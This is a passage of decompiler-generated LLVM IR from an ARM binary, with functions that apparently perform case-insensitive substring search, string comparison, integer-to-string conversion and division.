  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_113dc, { 7, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_115f4, { 23, 24, 21, 22, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10660, { 1, 0 }
}

define i32 @function_1066c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1066c:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10670 = load i8, i8* %tmp, align 1
  %v2_10674 = icmp eq i8 %v3_10670, 0
  br i1 %v2_10674, label %bb, label %dec_label_pc_10688

bb:                                               ; preds = %dec_label_pc_1066c
  %v4_10670 = zext i8 %v3_10670 to i32
  br label %dec_label_pc_1069c

dec_label_pc_10688:                               ; preds = %dec_label_pc_1066c
  br label %dec_label_pc_1068c

dec_label_pc_1068c:                               ; preds = %dec_label_pc_1068c, %dec_label_pc_10688
  %v0_1068c = phi i32 [ %v1_1068c, %dec_label_pc_1068c ], [ 0, %dec_label_pc_10688 ]
  %v1_1068c = add i32 %v0_1068c, 1
  %v2_10690 = add i32 %v1_1068c, %arg2
  %v3_10690 = inttoptr i32 %v2_10690 to i8*
  %v4_10690 = load i8, i8* %v3_10690, align 1
  %v2_10694 = icmp eq i8 %v4_10690, 0
  br i1 %v2_10694, label %dec_label_pc_1069c, label %dec_label_pc_1068c

dec_label_pc_1069c:                               ; preds = %dec_label_pc_1068c, %bb
  %v0_106e021 = phi i32 [ %v4_10670, %bb ], [ %v1_1068c, %dec_label_pc_1068c ]
  %v0_106a42 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_106a42, 1
  br i1 %tmp29, label %dec_label_pc_106f4, label %dec_label_pc_106b0

dec_label_pc_106b0:                               ; preds = %dec_label_pc_1069c, %dec_label_pc_106a4.backedge
  %v0_106a8.in = phi i32 [ %v0_106a8, %dec_label_pc_106a4.backedge ], [ %v0_106a42, %dec_label_pc_1069c ]
  %v1_106bc = phi i32 [ %v1_106bc15, %dec_label_pc_106a4.backedge ], [ 0, %dec_label_pc_1069c ]
  %v0_106b0 = phi i32 [ %v5_106b0, %dec_label_pc_106a4.backedge ], [ %tmp23, %dec_label_pc_1069c ]
  %v0_106a8 = add i32 %v0_106a8.in, -1
  %v1_106b0 = inttoptr i32 %v0_106b0 to i8*
  %v2_106b0 = load i8, i8* %v1_106b0, align 1
  %v3_106b0 = zext i8 %v2_106b0 to i32
  %v5_106b0 = add i32 %v0_106b0, 1
  %v1_106b4 = add nsw i32 %v3_106b0, -65
  %v2_106bc = add i32 %v1_106bc, %arg2
  %v3_106bc = inttoptr i32 %v2_106bc to i8*
  %v4_106bc = load i8, i8* %v3_106bc, align 1
  %v6_106bc = zext i8 %v4_106bc to i32
  %v1_106c0 = add nsw i32 %v6_106bc, -65
  %tmp38 = icmp ult i32 %v1_106b4, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_106b0
  %v5_106c4 = or i32 %v3_106b0, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_106b0, %bb30
  %v0_106d0 = phi i32 [ %v3_106b0, %dec_label_pc_106b0 ], [ %v5_106c4, %bb30 ]
  %tmp39 = icmp ult i32 %v1_106c0, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_106cc = or i32 %v6_106bc, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_106d0 = phi i32 [ %v6_106bc, %bb31 ], [ %v5_106cc, %bb32 ]
  %v9_106d0 = icmp eq i32 %v0_106d0, %v1_106d0
  br i1 %v9_106d0, label %dec_label_pc_106dc, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_106a4.backedge

dec_label_pc_106a4.backedge:                      ; preds = %bb34, %dec_label_pc_106dc
  %v1_106bc15 = phi i32 [ 0, %bb34 ], [ %v1_106dc, %dec_label_pc_106dc ]
  %tmp35 = icmp slt i32 %v0_106a8, 1
  br i1 %tmp35, label %dec_label_pc_106f4, label %dec_label_pc_106b0

dec_label_pc_106dc:                               ; preds = %bb33
  %v1_106dc = add i32 %v1_106bc, 1
  %v9_106e0 = icmp eq i32 %v0_106e021, %v1_106dc
  br i1 %v9_106e0, label %dec_label_pc_106e8, label %dec_label_pc_106a4.backedge

dec_label_pc_106e8:                               ; preds = %dec_label_pc_106dc
  %v2_106e8 = sub i32 %v5_106b0, %tmp23
  br label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106a4.backedge, %dec_label_pc_1069c, %dec_label_pc_106e8
  %storemerge = phi i32 [ %v2_106e8, %dec_label_pc_106e8 ], [ -1, %dec_label_pc_1069c ], [ -1, %dec_label_pc_106a4.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_106dc, { 1, 0 }
  uselistorder i32 %v0_106b0, { 1, 0 }
  uselistorder i32 %v1_106bc, { 1, 0 }
  uselistorder i8 %v3_10670, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_106f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_106a4.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_106b0, { 1, 0 }
}

define i32 @function_106fc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_106fc:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_106fc = load i8, i8* %arg1, align 1
  %v2_10700 = icmp eq i8 %v2_106fc, 0
  br i1 %v2_10700, label %bb, label %dec_label_pc_1070c

bb:                                               ; preds = %dec_label_pc_106fc
  %v3_106fc = zext i8 %v2_106fc to i32
  br label %dec_label_pc_10720

dec_label_pc_1070c:                               ; preds = %dec_label_pc_106fc
  br label %dec_label_pc_10710

dec_label_pc_10710:                               ; preds = %dec_label_pc_10710, %dec_label_pc_1070c
  %v0_10710 = phi i32 [ %v1_10710, %dec_label_pc_10710 ], [ 0, %dec_label_pc_1070c ]
  %v1_10710 = add i32 %v0_10710, 1
  %v2_10714 = add i32 %v1_10710, %tmp
  %v3_10714 = inttoptr i32 %v2_10714 to i8*
  %v4_10714 = load i8, i8* %v3_10714, align 1
  %v2_10718 = icmp eq i8 %v4_10714, 0
  br i1 %v2_10718, label %dec_label_pc_10720, label %dec_label_pc_10710

dec_label_pc_10720:                               ; preds = %dec_label_pc_10710, %bb
  %v0_1076c3 = phi i32 [ %v3_106fc, %bb ], [ %v1_10710, %dec_label_pc_10710 ]
  %v1_10720 = inttoptr i32 %arg2 to i8*
  %v2_10720 = load i8, i8* %v1_10720, align 1
  %v3_10720 = zext i8 %v2_10720 to i32
  store i32 %v3_10720, i32* @r3, align 4
  %v2_10724 = icmp eq i8 %v2_10720, 0
  br i1 %v2_10724, label %bb21, label %dec_label_pc_10730

bb21:                                             ; preds = %dec_label_pc_10720
  store i32 %v3_10720, i32* @r2, align 4
  br label %dec_label_pc_10744

dec_label_pc_10730:                               ; preds = %dec_label_pc_10720
  br label %dec_label_pc_10734

dec_label_pc_10734:                               ; preds = %dec_label_pc_10734, %dec_label_pc_10730
  %v0_10734 = phi i32 [ %v1_10734, %dec_label_pc_10734 ], [ 0, %dec_label_pc_10730 ]
  %v1_10734 = add i32 %v0_10734, 1
  store i32 %v1_10734, i32* @r2, align 4
  %v2_10738 = add i32 %v1_10734, %arg2
  %v3_10738 = inttoptr i32 %v2_10738 to i8*
  %v4_10738 = load i8, i8* %v3_10738, align 1
  %v6_10738 = zext i8 %v4_10738 to i32
  store i32 %v6_10738, i32* @r3, align 4
  %v2_1073c = icmp eq i8 %v4_10738, 0
  br i1 %v2_1073c, label %dec_label_pc_10744, label %dec_label_pc_10734

dec_label_pc_10744:                               ; preds = %dec_label_pc_10734, %bb21
  %v0_10744 = phi i32 [ %v3_10720, %bb21 ], [ %v1_10734, %dec_label_pc_10734 ]
  %v9_10744 = icmp eq i32 %v0_10744, %v0_1076c3
  br i1 %v9_10744, label %dec_label_pc_1076c.preheader, label %dec_label_pc_1074c

dec_label_pc_1076c.preheader:                     ; preds = %dec_label_pc_10744
  %v2_1076c5 = icmp eq i32 %v0_1076c3, 0
  br i1 %v2_1076c5, label %dec_label_pc_10774, label %dec_label_pc_10754

dec_label_pc_1074c:                               ; preds = %dec_label_pc_10754, %dec_label_pc_10744
  ret i32 0

dec_label_pc_10754:                               ; preds = %dec_label_pc_10764, %dec_label_pc_1076c.preheader
  %v0_1076c.in = phi i32 [ %v0_1076c, %dec_label_pc_10764 ], [ %v0_1076c3, %dec_label_pc_1076c.preheader ]
  %v0_10768 = phi i32 [ %v1_10768, %dec_label_pc_10764 ], [ %arg2, %dec_label_pc_1076c.preheader ]
  %v0_10764 = phi i32 [ %v1_10764, %dec_label_pc_10764 ], [ %tmp, %dec_label_pc_1076c.preheader ]
  %v0_1076c = add i32 %v0_1076c.in, -1
  %v1_10754 = inttoptr i32 %v0_10764 to i8*
  %v2_10754 = load i8, i8* %v1_10754, align 1
  %v3_10754 = zext i8 %v2_10754 to i32
  store i32 %v3_10754, i32* @r2, align 4
  %v1_10758 = inttoptr i32 %v0_10768 to i8*
  %v2_10758 = load i8, i8* %v1_10758, align 1
  %v3_10758 = zext i8 %v2_10758 to i32
  store i32 %v3_10758, i32* @r3, align 4
  %v9_1075c = icmp eq i8 %v2_10754, %v2_10758
  br i1 %v9_1075c, label %dec_label_pc_10764, label %dec_label_pc_1074c

dec_label_pc_10764:                               ; preds = %dec_label_pc_10754
  %v1_10764 = add i32 %v0_10764, 1
  %v1_10768 = add i32 %v0_10768, 1
  %v2_1076c = icmp eq i32 %v0_1076c, 0
  br i1 %v2_1076c, label %dec_label_pc_10774, label %dec_label_pc_10754

dec_label_pc_10774:                               ; preds = %dec_label_pc_10764, %dec_label_pc_1076c.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10734, { 0, 1, 3, 2 }
  uselistorder i8 %v2_106fc, { 1, 0 }
}

define i32 @function_1077c(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1077c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v3_1077c = load i32, i32* @r4, align 4
  %v12_1077c = load i32, i32* @r7, align 4
  %v0_10780 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10780, i32* %r8.global-to-local, align 4
  %v2_10780 = icmp eq i32 %v0_10780, 0
  store i1 %v2_10780, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_10780, label %dec_label_pc_10860, label %dec_label_pc_10790

dec_label_pc_10790:                               ; preds = %dec_label_pc_1077c
  %v3_10790 = icmp eq i8 %arg1, 0
  store i1 %v3_10790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10790, label %.thread, label %dec_label_pc_107a4

.thread:                                          ; preds = %dec_label_pc_10790
  %v4_10798 = inttoptr i32 %v0_10780 to i8*
  store i8 48, i8* %v4_10798, align 1
  %v0_1079c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1079c.pr.pr, label %.thread1, label %dec_label_pc_107a4

.thread1:                                         ; preds = %.thread
  %v4_1079c = load i32, i32* %r8.global-to-local, align 4
  %v5_1079c = add i32 %v4_1079c, 1
  %v6_1079c = inttoptr i32 %v5_1079c to i8*
  store i8 0, i8* %v6_1079c, align 1
  %v0_107a0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_107a0.pr.pr, label %dec_label_pc_10860, label %dec_label_pc_107a4

dec_label_pc_107a4:                               ; preds = %dec_label_pc_10790, %.thread, %.thread1
  %tmp47 = icmp slt i8 %arg1, 0
  %v7_107a8 = icmp eq i32 %arg2, 10
  store i1 %v7_107a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107a8, label %bb, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_107a4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_107a4
  %v4_107a4 = zext i1 %tmp47 to i32
  store i32 %v4_107a4, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp47, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_107c88 = sub nsw i32 0, %tmp
  %tmp.v3_107c88 = select i1 %phitmp, i32 %tmp, i32 %v3_107c88
  %tmp46 = zext i1 %phitmp to i32
  %. = xor i32 %tmp46, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread28
  %storemerge30 = phi i32 [ %tmp, %.thread28 ], [ %tmp.v3_107c88, %bb ]
  %storemerge = phi i32 [ 0, %.thread28 ], [ %., %bb ]
  store i32 %storemerge30, i32* @r4, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_107d4 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_107d4, i32* @r7, align 4
  br label %dec_label_pc_107d8

dec_label_pc_107d8:                               ; preds = %bb45, %.thread6
  %v0_107d8 = phi i32 [ %v0_107fc, %bb45 ], [ %storemerge30, %.thread6 ]
  store i32 %v0_107d8, i32* %r0.global-to-local, align 4
  %v0_107dc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_107dc, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_107d8, 16777216
  %v1_107e0 = sdiv i32 %sext, 16777216
  %v3_107e0 = call i32 @function_10974(i32 %v1_107e0, i32 %v0_107dc)
  %v7_107e4 = icmp eq i32 %v0_107dc, 9
  store i1 %v7_107e4, i1* %cpsr_z.global-to-local, align 1
  %v1_107e8 = add i32 %v0_107dc, 48
  %v0_107ec = load i32, i32* @r4, align 4
  store i32 %v0_107ec, i32* @r0, align 4
  %v7_107f0 = icmp sgt i32 %v0_107dc, 9
  %extract.t = trunc i32 %v1_107e8 to i8
  br i1 %v7_107f0, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_107d8
  %v9_107f0 = add i32 %v0_107dc, 55
  %extract.t27 = trunc i32 %v9_107f0 to i8
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_107d8, %bb44
  %v0_107f8.off0 = phi i8 [ %extract.t, %dec_label_pc_107d8 ], [ %extract.t27, %bb44 ]
  %v0_107f4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_107f4, i32* @r1, align 4
  %v2_107f8 = load i32, i32* %r5.global-to-local, align 4
  %v3_107f8 = load i32, i32* @r7, align 4
  %v4_107f8 = add i32 %v3_107f8, %v2_107f8
  %v5_107f8 = inttoptr i32 %v4_107f8 to i8*
  store i8 %v0_107f8.off0, i8* %v5_107f8, align 1
  %v0_107fc = call i32 @function_10878()
  store i32 %v0_107fc, i32* %r0.global-to-local, align 4
  store i32 %v0_107fc, i32* @r4, align 4
  %v2_10800 = icmp eq i32 %v0_107fc, 0
  store i1 %v2_10800, i1* %cpsr_z.global-to-local, align 1
  %v0_10804 = load i32, i32* %r5.global-to-local, align 4
  %v1_10804 = add i32 %v0_10804, -1
  store i32 %v1_10804, i32* %r5.global-to-local, align 4
  br i1 %v2_10800, label %dec_label_pc_1080c, label %dec_label_pc_107d8

dec_label_pc_1080c:                               ; preds = %bb45
  %v0_1080c = load i32, i32* %sl.global-to-local, align 4
  %v2_1080c = icmp eq i32 %v0_1080c, 0
  store i1 %v2_1080c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1080c, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_1080c
  %v3_10810 = ptrtoint i32* %stack_var_-32 to i32
  %v3_10814 = add i32 %v1_10804, %v3_10810
  store i32 %v3_10814, i32* %r2.global-to-local, align 4
  %v4_1081c = add i32 %v3_10814, -34
  %v5_1081c = inttoptr i32 %v4_1081c to i8*
  store i8 45, i8* %v5_1081c, align 1
  %v0_10820.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10820.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_10820.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_1080c
  %v1_10820 = phi i32 [ %v1_10804, %dec_label_pc_1080c ], [ %v1_10820.pre, %.thread11 ]
  %v2_10820 = add i32 %v1_10820, 1
  store i32 %v2_10820, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_1082c = phi i32 [ %v2_10820, %.thread12 ], [ %v1_10820.pre, %.thread11 ]
  %v0_10824 = load i32, i32* @r7, align 4
  %v2_10824 = add i32 %v0_10824, %v1_1082c
  %v3_10824 = inttoptr i32 %v2_10824 to i8*
  %v4_10824 = load i8, i8* %v3_10824, align 1
  %v6_10824 = zext i8 %v4_10824 to i32
  %v2_10828 = icmp eq i8 %v4_10824, 0
  store i1 %v2_10828, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10824, i32* %r2.global-to-local, align 4
  br i1 %v2_10828, label %dec_label_pc_10870, label %dec_label_pc_10838.preheader

dec_label_pc_10838.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10838

dec_label_pc_10838:                               ; preds = %dec_label_pc_10838.preheader, %dec_label_pc_10838
  %v0_10838 = phi i32 [ 0, %dec_label_pc_10838.preheader ], [ %v1_10838, %dec_label_pc_10838 ]
  %v1_10838 = add i32 %v0_10838, 1
  store i32 %v1_10838, i32* %r1.global-to-local, align 4
  %v2_1083c = add i32 %v1_10838, %v2_10824
  %v3_1083c = inttoptr i32 %v2_1083c to i8*
  %v4_1083c = load i8, i8* %v3_1083c, align 1
  %v2_10840 = icmp eq i8 %v4_1083c, 0
  store i1 %v2_10840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10840, label %dec_label_pc_10848, label %dec_label_pc_10838

dec_label_pc_10848:                               ; preds = %dec_label_pc_10838, %dec_label_pc_10870
  %v0_1084c24 = phi i32 [ %v6_10824, %dec_label_pc_10870 ], [ %v1_10838, %dec_label_pc_10838 ]
  %v0_10848 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10848, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1084c

dec_label_pc_1084c:                               ; preds = %dec_label_pc_1084c.dec_label_pc_1084c_crit_edge, %dec_label_pc_10848
  %v2_10858 = phi i32 [ %v5_10858, %dec_label_pc_1084c.dec_label_pc_1084c_crit_edge ], [ %v0_10848, %dec_label_pc_10848 ]
  %v0_10850 = phi i32 [ %v0_10850.pre, %dec_label_pc_1084c.dec_label_pc_1084c_crit_edge ], [ %v2_10824, %dec_label_pc_10848 ]
  %v0_1084c = phi i32 [ %v0_1084c.pre, %dec_label_pc_1084c.dec_label_pc_1084c_crit_edge ], [ %v0_1084c24, %dec_label_pc_10848 ]
  %v1_1084c = add i32 %v0_1084c, -1
  store i32 %v1_1084c, i32* %r1.global-to-local, align 4
  %v1_10850 = inttoptr i32 %v0_10850 to i8*
  %v2_10850 = load i8, i8* %v1_10850, align 1
  %v5_10850 = add i32 %v0_10850, 1
  store i32 %v5_10850, i32* %r2.global-to-local, align 4
  %v3_10854 = icmp eq i32 %v0_1084c, 0
  store i1 %v3_10854, i1* %cpsr_z.global-to-local, align 1
  %v3_10858 = inttoptr i32 %v2_10858 to i8*
  store i8 %v2_10850, i8* %v3_10858, align 1
  %v4_10858 = load i32, i32* %r0.global-to-local, align 4
  %v5_10858 = add i32 %v4_10858, 1
  store i32 %v5_10858, i32* %r0.global-to-local, align 4
  br i1 %v3_10854, label %dec_label_pc_10860, label %dec_label_pc_1084c.dec_label_pc_1084c_crit_edge

dec_label_pc_1084c.dec_label_pc_1084c_crit_edge:  ; preds = %dec_label_pc_1084c
  %v0_1084c.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10850.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1084c

dec_label_pc_10860:                               ; preds = %dec_label_pc_1084c, %.thread1, %dec_label_pc_1077c
  %v0_10860 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10860, i32* %r0.global-to-local, align 4
  store i32 %v3_1077c, i32* @r4, align 4
  store i32 %v12_1077c, i32* @r7, align 4
  ret i32 %v0_10860

dec_label_pc_10870:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10824, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10848

; uselistorder directives
  uselistorder i32 %v5_10858, { 1, 0 }
  uselistorder i1 %v3_10854, { 1, 0 }
  uselistorder i32 %v0_10850, { 1, 0 }
  uselistorder i32 %v1_10838, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10824, { 1, 0 }
  uselistorder i32 %v2_10824, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10820.pre, { 1, 0 }
  uselistorder i32 %v1_10804, { 1, 0, 2 }
  uselistorder i32 %v0_107fc, { 1, 2, 3, 0 }
  uselistorder i32 %v0_107dc, { 1, 0, 2, 3, 4, 5 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_10780, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 10, 9, 11, 12 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10848, { 1, 0 }
  uselistorder label %dec_label_pc_10838, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_107a4, { 2, 1, 0 }
}

define i32 @function_10878() local_unnamed_addr {
dec_label_pc_10878:
  %r2.global-to-local = alloca i32, align 4
  %v0_10878 = load i32, i32* @r1, align 4
  %v1_10878 = add i32 %v0_10878, -1
  store i32 %v1_10878, i32* %r2.global-to-local, align 4
  %v2_10878 = icmp eq i32 %v0_10878, 0
  %v7_10878 = icmp eq i32 %v0_10878, 1
  %v0_1087c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_10878, i32 %v0_1087c)
  br i1 %v2_10878, label %dec_label_pc_10960, label %dec_label_pc_10884

dec_label_pc_10884:                               ; preds = %dec_label_pc_10878
  %v0_10884 = load i32, i32* @r0, align 4
  %v1_10884 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_10884, %v1_10884
  br i1 %tmp, label %dec_label_pc_1088c, label %dec_label_pc_10918

dec_label_pc_1088c:                               ; preds = %dec_label_pc_10884
  %v1_1088c = load i32, i32* %r2.global-to-local, align 4
  %v2_1088c = and i32 %v1_1088c, %v1_10884
  %v4_1088c = icmp eq i32 %v2_1088c, 0
  br i1 %v4_1088c, label %dec_label_pc_10924, label %dec_label_pc_10894

dec_label_pc_10894:                               ; preds = %dec_label_pc_1088c
  %v3_10894 = icmp ult i32 %v1_10884, 536870912
  br i1 %v3_10894, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_10894
  %v4_10898 = mul i32 %v1_10884, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_10894, %.thread
  %v0_108b8.pr36.ph = phi i32 [ %v4_10898, %.thread ], [ %v1_10884, %dec_label_pc_10894 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_10894 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_108b8.pr36 = phi i32 [ %v4_108ac, %bb81 ], [ %v0_108b8.pr36.ph, %.preheader.preheader ]
  %v1_108b0 = phi i32 [ %v4_108b0, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_108a4 = icmp ugt i32 %v0_108b8.pr36, 268435455
  br i1 %v2_108a4, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_108b8thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_108a8 = icmp ult i32 %v0_108b8.pr36, %v0_10884
  br i1 %v4_108a8, label %bb80, label %dec_label_pc_108b8thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_108ac = and i32 %v0_108b8.pr36, 268435456
  %v3_108ac = icmp eq i32 %v2_108ac, 0
  %v4_108ac = mul i32 %v0_108b8.pr36, 16
  br i1 %v3_108ac, label %bb81, label %dec_label_pc_108b8.loopexit

bb81:                                             ; preds = %bb80
  %v2_108b0 = and i32 %v1_108b0, 268435456
  %v3_108b0 = icmp eq i32 %v2_108b0, 0
  %v4_108b0 = mul i32 %v1_108b0, 16
  br i1 %v3_108b0, label %.preheader, label %dec_label_pc_108b8thread-pre-split.loopexit.loopexit

dec_label_pc_108b8thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_108c448.ph = phi i32 [ %v1_108b0, %bb ], [ %v4_108b0, %bb81 ]
  %v0_108b8.pr38.ph = phi i32 [ %v0_108b8.pr36, %bb ], [ %v4_108ac, %bb81 ]
  br label %dec_label_pc_108b8thread-pre-split.loopexit

dec_label_pc_108b8thread-pre-split.loopexit:      ; preds = %dec_label_pc_108b8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_108c448 = phi i32 [ %v1_108b0, %.thread2 ], [ %v1_108c448.ph, %dec_label_pc_108b8thread-pre-split.loopexit.loopexit ]
  %v0_108b8.pr38 = phi i32 [ %v0_108b8.pr36, %.thread2 ], [ %v0_108b8.pr38.ph, %dec_label_pc_108b8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_108b8thread-pre-split

dec_label_pc_108b8thread-pre-split:               ; preds = %dec_label_pc_108b8thread-pre-split.loopexit, %bb83
  %v1_108c446 = phi i32 [ %v1_108c448, %dec_label_pc_108b8thread-pre-split.loopexit ], [ %v3_108c4, %bb83 ]
  %v0_108b8.pr = phi i32 [ %v0_108b8.pr38, %dec_label_pc_108b8thread-pre-split.loopexit ], [ %v3_108c0, %bb83 ]
  br label %dec_label_pc_108b8

dec_label_pc_108b8.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_108b8

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108b8.loopexit, %dec_label_pc_108b8thread-pre-split
  %v1_108c4 = phi i32 [ %v1_108c446, %dec_label_pc_108b8thread-pre-split ], [ %v1_108b0, %dec_label_pc_108b8.loopexit ]
  %v1_108c0 = phi i32 [ %v0_108b8.pr, %dec_label_pc_108b8thread-pre-split ], [ %v4_108ac, %dec_label_pc_108b8.loopexit ]
  %v2_108b8 = icmp slt i32 %v1_108c0, 0
  br i1 %v2_108b8, label %dec_label_pc_108cc, label %bb82

bb82:                                             ; preds = %dec_label_pc_108b8
  %v4_108bc = icmp ult i32 %v1_108c0, %v0_10884
  br i1 %v4_108bc, label %bb83, label %dec_label_pc_108cc

bb83:                                             ; preds = %bb82
  %v3_108c0 = mul i32 %v1_108c0, 2
  %v2_108c4 = icmp slt i32 %v1_108c4, 0
  %v3_108c4 = mul i32 %v1_108c4, 2
  br i1 %v2_108c4, label %dec_label_pc_108cc, label %dec_label_pc_108b8thread-pre-split

dec_label_pc_108cc:                               ; preds = %bb82, %dec_label_pc_108b8, %bb83
  %v2_108d859 = phi i32 [ %v3_108c4, %bb83 ], [ %v1_108c4, %bb82 ], [ %v1_108c4, %dec_label_pc_108b8 ]
  %v1_108d051 = phi i32 [ %v3_108c0, %bb83 ], [ %v1_108c0, %bb82 ], [ %v1_108c0, %dec_label_pc_108b8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_108d0

dec_label_pc_108d0:                               ; preds = %.thread11, %dec_label_pc_108cc
  %v1_10904 = phi i32 [ %v4_10904, %.thread11 ], [ %v2_108d859, %dec_label_pc_108cc ]
  %v1_108d8 = phi i32 [ %v0_10910, %.thread11 ], [ 0, %dec_label_pc_108cc ]
  %v1_10908 = phi i32 [ %v4_10908, %.thread11 ], [ %v1_108d051, %dec_label_pc_108cc ]
  %v1_108d4 = phi i32 [ %v0_10900, %.thread11 ], [ %v0_10884, %dec_label_pc_108cc ]
  %v3_108d0 = icmp ult i32 %v1_108d4, %v1_10908
  br i1 %v3_108d0, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_108d0
  %v3_108d4 = sub i32 %v1_108d4, %v1_10908
  %v3_108d8 = or i32 %v1_108d8, %v1_10904
  store i32 %v3_108d8, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_108d0, %bb84
  %v1_108e0 = phi i32 [ %v1_108d4, %dec_label_pc_108d0 ], [ %v3_108d4, %bb84 ]
